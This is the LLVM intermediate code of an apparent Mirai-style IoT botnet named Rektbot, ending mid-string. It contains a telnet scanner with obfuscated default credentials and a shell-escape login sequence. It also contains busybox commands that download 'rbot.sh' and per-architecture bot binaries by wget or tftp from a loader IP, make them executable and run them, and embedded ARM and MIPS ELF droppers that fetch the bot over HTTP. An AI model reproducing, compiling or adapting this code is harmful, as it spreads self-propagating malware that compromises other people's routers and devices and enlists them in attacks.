; ModuleID = 'host/ir_sub/Rektbot.ll'
source_filename = "llvm-link"
target datalayout = "e-m:e-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.in_addr = type { i32 }
%struct.payload = type { i8, i8, i8*, i16 }
%struct.scanner_auth = type { i8*, i8*, i16, i16, i8, i8 }
%struct.__sigset_t = type { [16 x i64] }
%struct.timeval = type { i64, i64 }
%union.__SOCKADDR_ARG = type { %struct.sockaddr* }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.scanner_connection = type { %struct.scanner_auth*, %struct.telnet_info, i32, i32, i32, i32, i32, [8192 x i8], [16 x i8], i8, i8, i8, i8, i16, i16, i32, i32 }
%struct.telnet_info = type { i32, i32 }
%struct.iphdr = type { i8, i8, i16, i16, i16, i8, i8, i16, i32, i32 }
%struct.tcphdr = type { i16, i16, i32, i32, i16, i16, i16, i16 }
%struct.binary = type { i8*, i8 }
%struct.__va_list_tag = type { i32, i32, i8*, i8* }
%struct.resolv_entries = type opaque

@fd_ctrl = global i32 -1, align 4
@fd_serv = global i32 -1, align 4
@pending_connection = global i8 0, align 1
@pid1 = common global i32 0, align 4
@pid2 = common global i32 0, align 4
@maintain_thread = common global i32 0, align 4
@LOCAL_ADDR = common global i32 0, align 4
@scanner_pid = common global i32 0, align 4
@spid = common global i32 0, align 4
@mainpid = common global i32 0, align 4
@srv_addr = common global %struct.sockaddr_in zeroinitializer, align 4
@.str = private unnamed_addr constant [2 x i8] c"/\00", align 1
@.str.1 = private unnamed_addr constant [8 x i8] c"unknown\00", align 1
@.str.2 = private unnamed_addr constant [13 x i8] c"/bin/busybox\00", align 1
@.str.3 = private unnamed_addr constant [5 x i8] c"\00\00\00\01\00", align 1
@ensure_single_instance.local_bind = internal global i8 1, align 1
@fake_time = global i32 0, align 4
@rsck = common global i32 0, align 4
@scanner_rawpkt = global [40 x i8] zeroinitializer, align 16
@.str.20 = private unnamed_addr constant [5 x i8] c"PMMV\00", align 1
@.str.21 = private unnamed_addr constant [6 x i8] c"VVLGV\00", align 1
@.str.22 = private unnamed_addr constant [9 x i8] c"\13\12\12\13AJKL\00", align 1
@.str.23 = private unnamed_addr constant [6 x i8] c"KTFGT\00", align 1
@.str.24 = private unnamed_addr constant [1 x i8] zeroinitializer, align 1
@.str.25 = private unnamed_addr constant [4 x i8] c"@KL\00", align 1
@.str.26 = private unnamed_addr constant [8 x i8] c"FGDCWNV\00", align 1
@.str.27 = private unnamed_addr constant [7 x i8] c"FCGOML\00", align 1
@.str.28 = private unnamed_addr constant [7 x i8] c"AOQ\17\12\12\00", align 1
@.str.29 = private unnamed_addr constant [8 x i8] c"pmmv\17\12\12\00", align 1
@.str.30 = private unnamed_addr constant [5 x i8] c"pmmv\00", align 1
@.str.31 = private unnamed_addr constant [8 x i8] c"VQNKLWZ\00", align 1
@.str.32 = private unnamed_addr constant [9 x i8] c"XQWL\13\13\1A\1A\00", align 1
@.str.33 = private unnamed_addr constant [10 x i8] c"rNQaJEoG\13\00", align 1
@.str.34 = private unnamed_addr constant [8 x i8] c"WREPCFG\00", align 1
@.str.35 = private unnamed_addr constant [6 x i8] c"VGNAM\00", align 1
@.str.36 = private unnamed_addr constant [5 x i8] c"\13\13\13\13\00", align 1
@.str.37 = private unnamed_addr constant [5 x i8] c"\16\11\10\13\00", align 1
@.str.38 = private unnamed_addr constant [6 x i8] c"WKF\1F\12\00", align 1
@.str.39 = private unnamed_addr constant [5 x i8] c"WKF\12\00", align 1
@.str.40 = private unnamed_addr constant [7 x i8] c"Q[QVGO\00", align 1
@.str.41 = private unnamed_addr constant [11 x i8] c"VGNLGVPMMV\00", align 1
@.str.42 = private unnamed_addr constant [13 x i8] c"PMMVRCQQUMPF\00", align 1
@.str.43 = private unnamed_addr constant [9 x i8] c"PMMVRCQQ\00", align 1
@.str.44 = private unnamed_addr constant [11 x i8] c"VGNLGVRCQQ\00", align 1
@.str.45 = private unnamed_addr constant [15 x i8] c"VGNLGVRCQQUMPF\00", align 1
@.str.46 = private unnamed_addr constant [9 x i8] c"RCQQUMPF\00", align 1
@.str.47 = private unnamed_addr constant [5 x i8] c"RCQQ\00", align 1
@.str.48 = private unnamed_addr constant [6 x i8] c"QJGNN\00", align 1
@.str.49 = private unnamed_addr constant [14 x i8] c"VCxXb\10\11\16\1B\17\1A\17\1B\00", align 1
@.str.50 = private unnamed_addr constant [10 x i8] c"VQEMKLEML\00", align 1
@.str.51 = private unnamed_addr constant [10 x i8] c"QWRGPWQGP\00", align 1
@.str.52 = private unnamed_addr constant [11 x i8] c"NKLWZQJGNN\00", align 1
@.str.53 = private unnamed_addr constant [15 x i8] c"V\12VCNA\12LVP\12N\16\03\00", align 1
@.str.54 = private unnamed_addr constant [6 x i8] c"EWGQV\00", align 1
@.str.55 = private unnamed_addr constant [7 x i8] c"\13\10\11\16\17\14\00", align 1
@.str.56 = private unnamed_addr constant [6 x i8] c"\13\10\11\16\17\00", align 1
@.str.57 = private unnamed_addr constant [5 x i8] c"WQGP\00", align 1
@.str.58 = private unnamed_addr constant [6 x i8] c"CFOKL\00", align 1
@.str.59 = private unnamed_addr constant [7 x i8] c"FGTKAG\00", align 1
@.str.60 = private unnamed_addr constant [5 x i8] c"\13\10\11\16\00", align 1
@.str.61 = private unnamed_addr constant [11 x i8] c"\13\10\11\16\17\14\15\1A\1B\12\00", align 1
@.str.62 = private unnamed_addr constant [7 x i8] c"\13\13\13\13\13\13\00", align 1
@.str.63 = private unnamed_addr constant [5 x i8] c"\13\1B\1A\1A\00", align 1
@.str.64 = private unnamed_addr constant [6 x i8] c"\10\10\10\10\10\00", align 1
@.str.65 = private unnamed_addr constant [14 x i8] c"cFOKLKQVPCVMP\00", align 1
@.str.66 = private unnamed_addr constant [14 x i8] c"CFOKLKQVPCVMP\00", align 1
@.str.67 = private unnamed_addr constant [6 x i8] c"cFOKL\00", align 1
@.str.68 = private unnamed_addr constant [4 x i8] c"CFO\00", align 1
@.str.69 = private unnamed_addr constant [13 x i8] c"\15WHoIM\12CFOKL\00", align 1
@.str.70 = private unnamed_addr constant [9 x i8] c"QOACFOKL\00", align 1
@.str.71 = private unnamed_addr constant [10 x i8] c"CFOKL\13\10\11\16\00", align 1
@.str.72 = private unnamed_addr constant [9 x i8] c"CFOKL\13\10\11\00", align 1
@.str.73 = private unnamed_addr constant [7 x i8] c"C@A\13\10\11\00", align 1
@.str.74 = private unnamed_addr constant [9 x i8] c"ACV\13\12\10\1B\22\00", align 1
@.str.75 = private unnamed_addr constant [4 x i8] c"\17WR\00", align 1
@.str.76 = private unnamed_addr constant [6 x i8] c"\03PMMV\00", align 1
@.str.77 = private unnamed_addr constant [2 x i8] c"\13\00", align 1
@.str.78 = private unnamed_addr constant [3 x i8] c"\13\10\00", align 1
@.str.79 = private unnamed_addr constant [7 x i8] c"CLVQNS\00", align 1
@.str.80 = private unnamed_addr constant [9 x i8] c"\13\10\11\16\17\14\15\1A\00", align 1
@.str.81 = private unnamed_addr constant [7 x i8] c"\12\12\12\12\12\12\00", align 1
@.str.82 = private unnamed_addr constant [9 x i8] c"\12\12\12\12\12\12\12\12\00", align 1
@.str.83 = private unnamed_addr constant [9 x i8] c"\13\10\11\16SUGP\00", align 1
@.str.84 = private unnamed_addr constant [9 x i8] c"CLLK\10\12\13\11\00", align 1
@.str.85 = private unnamed_addr constant [6 x i8] c"\17\16\11\10\13\00", align 1
@.str.86 = private unnamed_addr constant [7 x i8] c"XNZZ\0C\22\00", align 1
@.str.87 = private unnamed_addr constant [6 x i8] c"HT@XF\00", align 1
@.str.88 = private unnamed_addr constant [5 x i8] c"CLIM\00", align 1
@.str.89 = private unnamed_addr constant [8 x i8] c"ZOJFKRA\00", align 1
@.str.90 = private unnamed_addr constant [7 x i8] c"ZA\11\17\13\13\00", align 1
@.str.91 = private unnamed_addr constant [6 x i8] c"TKXZT\00", align 1
@.str.92 = private unnamed_addr constant [8 x i8] c"CLVQNS\22\00", align 1
@.str.93 = private unnamed_addr constant [9 x i8] c"HWCLVGAJ\00", align 1
@.str.94 = private unnamed_addr constant [8 x i8] c"eo\1A\13\1A\10\22\00", align 1
@.str.95 = private unnamed_addr constant [7 x i8] c"\1A\1A\1A\1A\1A\1A\00", align 1
@.str.96 = private unnamed_addr constant [7 x i8] c"\14\14\14\14\14\14\00", align 1
@.str.97 = private unnamed_addr constant [9 x i8] c"JWLV\17\15\17\1B\00", align 1
@.str.98 = private unnamed_addr constant [11 x i8] c"QWRGPTKQMP\00", align 1
@.str.99 = private unnamed_addr constant [9 x i8] c"X[CF\13\10\11\16\00", align 1
@.str.100 = private unnamed_addr constant [7 x i8] c"OE\11\17\12\12\00", align 1
@.str.101 = private unnamed_addr constant [7 x i8] c"OGPNKL\00", align 1
@.str.102 = private unnamed_addr constant [8 x i8] c"QWRRMPV\00", align 1
@.str.103 = private unnamed_addr constant [7 x i8] c"VGNLGV\00", align 1
@.str.104 = private unnamed_addr constant [9 x i8] c"MRGPCVMP\00", align 1
@.str.105 = private unnamed_addr constant [37 x i8] c"enable\0D\0Asystem\0D\0Ashell\0D\0Ash\0D\0Aping ; sh\00", align 1
@.str.106 = private unnamed_addr constant [3 x i8] c"%s\00", align 1
@.str.107 = private unnamed_addr constant [141 x i8] c"/bin/busybox cat /bin/busybox || while read i; do /bin/busybox echo $i; done < /bin/busybox || /bin/busybox dd if=/bin/busybox bs=22 count=1\00", align 1
@.str.108 = private unnamed_addr constant [4 x i8] c"arm\00", align 1
@.str.109 = private unnamed_addr constant [5 x i8] c"arm4\00", align 1
@.str.110 = private unnamed_addr constant [142 x i8] c"/bin/busybox cat /proc/cpuinfo || while read i; do /bin/busybox echo $i; done < /proc/cpuinfo || /bin/busybox dd if=/proc/cpuinfo count=1; %s\00", align 1
@tmp_dirs = global [15 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.4, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.1.5, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.2.6, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.3.7, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.4.8, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.5, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.6, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.7, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.8, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.9, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.10, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.11, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.12, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.13, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.14, i32 0, i32 0)], align 16
@.str.111 = private unnamed_addr constant [18 x i8] c">%s.file && cd %s\00", align 1
@.str.112 = private unnamed_addr constant [32 x i8] c"/bin/busybox rm -rf .file %s %s\00", align 1
@.str.113 = private unnamed_addr constant [13 x i8] c".rbot.binary\00", align 1
@.str.114 = private unnamed_addr constant [14 x i8] c".rbot.dropper\00", align 1
@.str.115 = private unnamed_addr constant [98 x i8] c"/bin/busybox cp /bin/busybox .rbot.binary; >.rbot.binary; /bin/busybox chmod 777 .rbot.binary; %s\00", align 1
@.str.116 = private unnamed_addr constant [8 x i8] c"unknown\00", align 1
@.str.117 = private unnamed_addr constant [142 x i8] c"/bin/busybox wget http://%d.%d.%d.%d/rbot.sh -O- >.rbot.shell; /bin/busybox tftp -g -l .rbot.shell -r rbot.sh %d.%d.%d.%d; sh .rbot.shell; %s\00", align 1
@.str.118 = private unnamed_addr constant [41 x i8] c"/bin/busybox wget; /bin/busybox tftp; %s\00", align 1
@.str.119 = private unnamed_addr constant [101 x i8] c"/bin/busybox cp /bin/busybox .rbot.dropper; >.rbot.dropper; /bin/busybox chmod 777 .rbot.dropper; %s\00", align 1
@.str.120 = private unnamed_addr constant [125 x i8] c"/bin/busybox wget http://%d.%d.%d.%d/rbot.%s -O- >.rbot.binary; /bin/busybox chmod 777 .rbot.binary;./.rbot.binarys wget; %s\00", align 1
@.str.121 = private unnamed_addr constant [121 x i8] c"/bin/busybox tftp -g -l .rbot.binary -r rbot.%s %d.%d.%d.%d; /bin/busybox chmod 777 .rbot.binary;./.rbot.binary tftp; %s\00", align 1
@.str.123 = private unnamed_addr constant [2 x i8] c">\00", align 1
@.str.124 = private unnamed_addr constant [3 x i8] c">>\00", align 1
@.str.125 = private unnamed_addr constant [36 x i8] c"./.rbot.dropper;./.rbot.binary echo\00", align 1
@.str.126 = private unnamed_addr constant [24 x i8] c"chmod 777 .rbot.dropper\00", align 1
@.str.122 = private unnamed_addr constant [50 x i8] c"/bin/busybox echo -en '%s' %s .rbot.dropper;%s;%s\00", align 1
@.str.150 = private unnamed_addr constant [21 x i8] c"ead-only file system\00", align 1
@.str.151 = private unnamed_addr constant [17 x i8] c"ermission denied\00", align 1
@.str.130 = private unnamed_addr constant [7 x i8] c"\5Cx%02x\00", align 1
@payloads = global [4 x %struct.payload] [%struct.payload { i8 1, i8 40, i8* getelementptr inbounds ([1081 x i8], [1081 x i8]* @.str.16, i32 0, i32 0), i16 1080 }, %struct.payload { i8 1, i8 41, i8* getelementptr inbounds ([1337 x i8], [1337 x i8]* @.str.17, i32 0, i32 0), i16 1336 }, %struct.payload { i8 2, i8 8, i8* getelementptr inbounds ([1889 x i8], [1889 x i8]* @.str.18, i32 0, i32 0), i16 1888 }, %struct.payload { i8 1, i8 8, i8* getelementptr inbounds ([1921 x i8], [1921 x i8]* @.str.19, i32 0, i32 0), i16 1920 }], align 16
@.str.16 = private unnamed_addr constant [1081 x i8] c"\7FELF\01\01\01a\00\00\00\00\00\00\00\00\02\00(\00\01\00\00\00\DC\82\00\004\00\00\00p\03\00\00\02\02\00\004\00 \00\02\00(\00\05\00\04\00\01\00\00\00\00\00\00\00\00\80\00\00\00\80\00\00P\03\00\00P\03\00\00\05\00\00\00\00\80\00\00\01\00\00\00P\03\00\00P\03\01\00P\03\01\00\00\00\00\00\08\00\00\00\06\00\00\00\00\80\00\00\01\18\A0\E1\FF\18\01\E2\00\1C\81\E1\FF0\03\E2\02$\A0\E1\03\10\81\E1\FF,\02\E2\01 \82\E1\FF<\02\E2\FF\08\02\E2\034\A0\E1 \04\A0\E1\22\0C\80\E1\02<\83\E1\00\00\83\E1\0E\F0\A0\E1\00\10\A0\E1\00\00\9F\E5\87\00\00\EA\01\00\90\00\00\10\A0\E1\00\00\9F\E5\83\00\00\EA\06\00\90\00\01\C0\A0\E1\00\10\A0\E1\08\00\9F\E5\020\A0\E1\0C \A0\E1|\00\00\EA\05\00\90\00\04\E0-\E5\0C\D0M\E2\07\00\8D\E8\03\10\A0\E3\0D \A0\E1\08\00\9F\E5t\00\00\EB\0C\D0\8D\E2\00\80\BD\E8f\00\90\00\01\C0\A0\E1\00\10\A0\E1\08\00\9F\E5\020\A0\E1\0C \A0\E1k\00\00\EA\04\00\90\00\01\C0\A0\E1\00\10\A0\E1\08\00\9F\E5\020\A0\E1\0C \A0\E1d\00\00\EA\03\00\90\00\04\E0-\E5\0C\D0M\E2\07\00\8D\E8\01\10\A0\E3\0D \A0\E1\08\00\9F\E5\5C\00\00\EB\0C\D0\8D\E2\00\80\BD\E8f\00\90\00\F0A-\E9@\E1\9F\E5\94\D0M\E2\00\00\00\EA\01\E0\8E\E2\00`\DE\E5\00\00V\E3\FB\FF\FF\1A$\C1\9F\E5\D00\A0\E3\0E\80l\E0\02@\A0\E3P\C0\A0\E3k\10\A0\E3\85 \A0\E3\B0\00\A0\E3\83\C0\CD\E5\80@\CD\E5\81`\CD\E5\82`\CD\E5\A9\FF\FF\EB\F4\10\9F\E5\84\00\8D\E5\F0 \9F\E5\F0\00\9F\E5\BC\FF\FF\EB\01\10\A0\E3\00p\A0\E1\06 \A0\E1\04\00\A0\E1\D6\FF\FF\EB\01\00p\E3\01\00w\13\00P\A0\E1\01\00\A0\03\AA\FF\FF\0B\05\00\A0\E1\80\10\8D\E2\10 \A0\E3\B5\FF\FF\EB\00\00P\E3\00\00`\B2\A3\FF\FF\BB\17@\88\E2\05\00\A0\E1\A0\10\9F\E5\04 \A0\E1\B7\FF\FF\EB\04\00P\E1\03\00\A0\13\9B\FF\FF\1B\06@\A0\E1\93\10\8D\E2\01 \A0\E3\05\00\A0\E1\B6\FF\FF\EB\01\00P\E3\04\00\A0\E3\93\FF\FF\1B\930\DD\E5\04D\83\E1d0\9F\E5\03\00T\E1\F3\FF\FF\1A\0D\10\A0\E1\80 \A0\E3\05\00\A0\E1\AA\FF\FF\EB\00 P\E2\0D@\A0\E1\0D\10\A0\E1\07\00\A0\E1\01\00\00\DA\9D\FF\FF\EB\F4\FF\FF\EA\05\00\A0\E1\85\FF\FF\EB\07\00\A0\E1\83\FF\FF\EB\05\00\A0\E3}\FF\FF\EB\94\D0\8D\E2\F0\81\BD\E8\1C\83\00\00A\02\00\00\FF\01\00\00$\83\00\004\83\00\00\0A\0D\0A\0D\A5\FF\FF\EAp@-\E9\10@\8D\E2p\00\94\E8q\00\90\EF\01\0Ap\E3\00@\A0\E1p\80\BD\98\03\00\00\EB\000d\E2\000\80\E5\00\00\E0\E3p\80\BD\E8\00\00\9F\E5\0E\F0\A0\E1P\03\01\00arm4\00\00\00\00.rbot.binary\00\00\00\00GET /rbot.arm4 HTTP/1.0\0D\0A\0D\0A\00\00.shstrtab\00.text\00.rodata\00.bss\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\0B\00\00\00\01\00\00\00\06\00\00\00t\80\00\00t\00\00\00\A8\02\00\00\00\00\00\00\00\00\00\00\04\00\00\00\00\00\00\00\11\00\00\00\01\00\00\002\00\00\00\1C\83\00\00\1C\03\00\004\00\00\00\00\00\00\00\00\00\00\00\04\00\00\00\01\00\00\00\19\00\00\00\08\00\00\00\03\00\00\00P\03\01\00P\03\00\00\08\00\00\00\00\00\00\00\00\00\00\00\04\00\00\00\00\00\00\00\01\00\00\00\03\00\00\00\00\00\00\00\00\00\00\00P\03\00\00\1E\00\00\00\00\00\00\00\00\00\00\00\01\00\00\00\00\00\00\00\00", align 1
@.str.17 = private unnamed_addr constant [1337 x i8] c"\7FELF\01\01\01\00\00\00\00\00\00\00\00\00\02\00(\00\01\00\00\00l\83\00\004\00\00\00H\04\00\00\02\00\00\044\00 \00\04\00(\00\06\00\05\00\01\00\00\00\00\00\00\00\00\80\00\00\00\80\00\00\14\04\00\00\14\04\00\00\05\00\00\00\00\80\00\00\01\00\00\00\14\04\00\00\14\04\01\00\14\04\01\00\10\00\00\00\10\00\00\00\06\00\00\00\00\80\00\00\07\00\00\00\14\04\00\00\14\04\01\00\14\04\01\00\00\00\00\00\08\00\00\00\04\00\00\00\04\00\00\00Q\E5td\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\07\00\00\00\04\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\018\83\E1\00<\83\E1\024\83\E1\03\0C\A0\E1\02\08\80\E1\FF(\03\E2\22\04\80\E1#\0C\80\E1\1E\FF/\E1\04\E0-\E5\00\10\A0\E1\04\D0M\E2\01\00\A0\E3\9D\00\00\EB\04\D0\8D\E2\04\E0\9D\E4\1E\FF/\E1\04\E0-\E5\00\10\A0\E1\04\D0M\E2\06\00\A0\E3\95\00\00\EB\04\D0\8D\E2\04\E0\9D\E4\1E\FF/\E1\04\E0-\E5\01\C0\A0\E1\020\A0\E1\00\10\A0\E1\04\D0M\E2\0C \A0\E1\05\00\A0\E3\8A\00\00\EB\04\D0\8D\E2\04\E0\9D\E4\1E\FF/\E1\04\E0-\E5\01\C0\A0\E1\020\A0\E1\00\10\A0\E1\04\D0M\E2\0C \A0\E1\0C\00\9F\E5\7F\00\00\EB\04\D0\8D\E2\04\E0\9D\E4\1E\FF/\E1\1B\01\00\00\04\E0-\E5\01\C0\A0\E1\020\A0\E1\00\10\A0\E1\04\D0M\E2\0C \A0\E1\04\00\A0\E3s\00\00\EB\04\D0\8D\E2\04\E0\9D\E4\1E\FF/\E1\04\E0-\E5\01\C0\A0\E1\020\A0\E1\00\10\A0\E1\04\D0M\E2\0C \A0\E1\03\00\A0\E3h\00\00\EB\04\D0\8D\E2\04\E0\9D\E4\1E\FF/\E1\04\E0-\E5\01\C0\A0\E1\020\A0\E1\00\10\A0\E1\04\D0M\E2\0C \A0\E1\0C\00\9F\E5]\00\00\EB\04\D0\8D\E2\04\E0\9D\E4\1E\FF/\E1\19\01\00\00\F0A-\E9@1\9F\E5\98\D0M\E2\00@\A0\E3\00\00\00\EA\01@\84\E2\01`S\E5\00\00V\E3\010\83\E2\FA\FF\FF\1A\02\C0\A0\E3\D00\A0\E3k\10\A0\E3\85 \A0\E3\B4\C8\CD\E1\B0\00\A0\E3\05\CA\A0\E3\B6\C8\CD\E1\9A\FF\FF\EB\FC\10\9F\E5\88\00\8D\E5\F8 \9F\E5\F8\00\9F\E5\AE\FF\FF\EB\01\10\A0\E3\00p\A0\E1\06 \A0\E1\02\00\A0\E3\D6\FF\FF\EB\01\00p\E3\01\00w\13\00P\A0\E1\01\00\A0\03\94\FF\FF\0B\05\00\A0\E1\84\10\8D\E2\10 \A0\E3\AB\FF\FF\EB\00\00P\E3\00\00`\B2\8D\FF\FF\BB\17@\84\E2\05\00\A0\E1\A8\10\9F\E5\04 \A0\E1\AF\FF\FF\EB\04\00P\E1\03\00\A0\13\85\FF\FF\1B\94\80\9F\E5\06@\A0\E1\97`\8D\E2\06\10\A0\E1\01 \A0\E3\05\00\A0\E1\B0\FF\FF\EB\01\00P\E3\04\00\A0\E3{\FF\FF\1B\970\DD\E5\04D\83\E1\08\00T\E1\F4\FF\FF\1A\04@\8D\E2\04\10\A0\E1\80 \A0\E3\05\00\A0\E1\A4\FF\FF\EB\00 P\E2\04\10\A0\E1\07\00\A0\E1\01\00\00\DA\94\FF\FF\EB\F5\FF\FF\EA\05\00\A0\E1r\FF\FF\EB\07\00\A0\E1p\FF\FF\EB\05\00\A0\E3f\FF\FF\EB\98\D0\8D\E2\F0A\BD\E8\1E\FF/\E1\E1\83\00\00A\02\00\00\FF\01\00\00\E8\83\00\00\F8\83\00\00\0A\0D\0A\0D\A5\FF\FF\EA\0D\C0\A0\E1\F0\00-\E9\00p\A0\E1\01\00\A0\E1\02\10\A0\E1\03 \A0\E1x\00\9C\E8\00\00\00\EF\F0\00\BD\E8\01\0Ap\E3\0E\F0\A01\FF\FF\FF\EA\04\E0-\E5\1C \9F\E5\000\A0\E1\02 \9F\E7\06\00\00\EB\000c\E2\020\80\E7\00\00\E0\E3\04\E0\9D\E4\1E\FF/\E1l\80\00\00\00\00\00\00\0F\0A\E0\E3\1F\F0@\E2\00\00\A0\E1\00\00\A0\E1arm7\00\00\00\00.rbot.binary\00\00\00\00GET /rbot.arm7 HTTP/1.0\0D\0A\0D\0A\00\00\00\00\00\00\00\00\00\00\00\00\00\08\00\00\00\00.shstrtab\00.text\00.rodata\00.tbss\00.got\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\0B\00\00\00\01\00\00\00\06\00\00\00\C0\80\00\00\C0\00\00\00 \03\00\00\00\00\00\00\00\00\00\00\10\00\00\00\00\00\00\00\11\00\00\00\01\00\00\002\00\00\00\E0\83\00\00\E0\03\00\004\00\00\00\00\00\00\00\00\00\00\00\04\00\00\00\01\00\00\00\19\00\00\00\08\00\00\00\03\04\00\00\14\04\01\00\14\04\00\00\08\00\00\00\00\00\00\00\00\00\00\00\04\00\00\00\00\00\00\00\1F\00\00\00\01\00\00\00\03\00\00\00\14\04\01\00\14\04\00\00\10\00\00\00\00\00\00\00\00\00\00\00\04\00\00\00\04\00\00\00\01\00\00\00\03\00\00\00\00\00\00\00\00\00\00\00$\04\00\00$\00\00\00\00\00\00\00\00\00\00\00\01\00\00\00\00\00\00\00\00", align 1
@.str.18 = private unnamed_addr constant [1889 x i8] c"\7FELF\01\02\01\00\00\00\00\00\00\00\00\00\00\02\00\08\00\00\00\01\00@\04`\00\00\004\00\00\06H\00\00\10\07\004\00 \00\03\00(\00\07\00\06\00\00\00\01\00\00\00\00\00@\00\00\00@\00\00\00\00\05\B4\00\00\05\B4\00\00\00\05\00\01\00\00\00\00\00\01\00\00\05\C0\00D\05\C0\00D\05\C0\00\00\00T\00\00\00p\00\00\00\06\00\01\00\00dt\E5Q\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\07\00\00\00\04\00\00\00\00\00\00\00\00\00\00\00\000\A5\00\FF\00\05,\00\00\04&\00\00\85 %0\C2\00\FF0\E7\00\FF\00\87 %\00\02\12\00\03\E0\00\08\00D\10%<\1C\00\05'\9C\84\E8\03\99\E0!\8F\99\80\5C\00\80(!\03 \00\08$\04\0F\A1<\1C\00\05'\9C\84\CC\03\99\E0!\8F\99\80\5C\00\80(!\03 \00\08$\04\0F\A6<\1C\00\05'\9C\84\B0\03\99\E0!\00\A0\10!\8F\99\80\5C\00\C08!\00\80(!\00@0!\03 \00\08$\04\0F\A5<\1C\00\05'\9C\84\88\03\99\E0!'\BD\FF\D0\AF\BF\00(\AF\BC\00\10\8F\99\80\5C\AF\A4\00\18\AF\A5\00\1C\AF\A6\00 $\04\10\06'\A6\00\18\03 \F8\09$\05\00\03\8F\BC\00\10\8F\BF\00(\00\00\00\00\03\E0\00\08'\BD\000<\1C\00\05'\9C\84<\03\99\E0!\00\A0\10!\8F\99\80\5C\00\C08!\00\80(!\00@0!\03 \00\08$\04\0F\A4<\1C\00\05'\9C\84\14\03\99\E0!\00\A0\10!\8F\99\80\5C\00\C08!\00\80(!\00@0!\03 \00\08$\04\0F\A3<\1C\00\05'\9C\83\EC\03\99\E0!'\BD\FF\D0\AF\BF\00(\AF\BC\00\10\8F\99\80\5C\AF\A4\00\18\AF\A5\00\1C\AF\A6\00 $\04\10\06'\A6\00\18\03 \F8\09$\05\00\01\8F\BC\00\10\8F\BF\00(\00\00\00\00\03\E0\00\08'\BD\000<\1C\00\05'\9C\83\A0\03\99\E0!'\BD\FF@\AF\BF\00\BC\AF\B2\00\B8\AF\B1\00\B4\AF\B0\00\B0\AF\BC\00\10\8F\82\80\18\00\00\00\00$P\05\80\82\02\00\00\00\00\00\00\14@\FF\FD&\10\00\01&\10\FF\FF$\02\00\02\A7\A2\00\1C$\02\00P\A7\A2\00\1E\8F\82\80\18\8F\99\80L$\07\00\D0$\04\00\B0$\05\00k$\06\00\85$B\05\80\03 \F8\09\02\02\80#\8F\BC\00\10$\05\03\01\8F\84\80\18\8F\99\80`$\84\05\88$\06\01\FF\03 \F8\09\AF\A2\00 \8F\BC\00\10$\04\00\02\8F\99\80P$\05\00\02\00\000!\03 \F8\09\00@\90!\00@\88!$\02\FF\FF\8F\BC\00\10\12\22\00\03\00\00\00\00\16B\00\07\00\00\00\00\8F\99\80T\00\00\00\00\03 \F8\09$\04\00\01\8F\BC\00\10\00\00\00\00\8F\99\80D\02  !'\A5\00\1C\03 \F8\09$\06\00\10\8F\BC\00\10\04A\00\07\00\00\00\00\8F\99\80T\00\00\00\00\03 \F8\09\00\02 #\8F\BC\00\10\00\00\00\00\8F\85\80\18\8F\99\80H&\10\00\17$\A5\05\98\02  !\03 \F8\09\02\000!\8F\BC\00\10\10P\00\07\00\00\80!\8F\99\80T\00\00\00\00\03 \F8\09$\04\00\03\8F\BC\00\10\00\00\80!\8F\99\808\02  !'\A5\00\18\03 \F8\09$\06\00\01\8F\BC\00\10$\03\00\01\8F\99\80T\10C\00\04$\04\00\04\03 \F8\09\00\00\00\00\8F\BC\00\10\83\A3\00\18\00\10\12\00\00C\80%<\02\0D\0A4B\0D\0A\16\02\FF\ED\00\00\00\00\8F\99\808'\B0\00,\02  !\02\00(!\03 \F8\09$\06\00\80\8F\BC\00\10\02\00(!\8F\99\80H\00@0!\18@\00\06\02@ !\03 \F8\09\00\00\00\00\8F\BC\00\10\10\00\FF\F0\00\00\00\00\8F\99\80X\00\00\00\00\03 \F8\09\02  !\8F\BC\00\10\00\00\00\00\8F\99\80X\00\00\00\00\03 \F8\09\02@ !\8F\BC\00\10\00\00\00\00\8F\99\80T\00\00\00\00\03 \F8\09$\04\00\05\8F\BC\00\10\8F\BF\00\BC\8F\B2\00\B8\8F\B1\00\B4\8F\B0\00\B0\03\E0\00\08'\BD\00\C0<\1C\00\05'\9C\81P\03\99\E0!\03\E0\00!\04\11\00\01\00\00\00\00<\1C\00\05'\9C\818\03\9F\E0!\00\00\F8!\8F\99\80<\00\00\00\00\03 \00\08\00\00\00\00\00\00\00\00\00\00\00\00<\1C\00\05'\9C\81\10\03\99\E0!\00\80\10!\00\A0 !\00\C0(!\00\E00!\8F\A7\00\10\8F\A8\00\14\8F\A9\00\18\8F\AA\00\1C'\BD\FF\E0\AF\A8\00\10\AF\A9\00\14\AF\AA\00\18\AF\A2\00\1C\8F\A2\00\1C\00\00\00\0C\14\E0\00\03'\BD\00 \03\E0\00\08\00\00\00\00\00@ 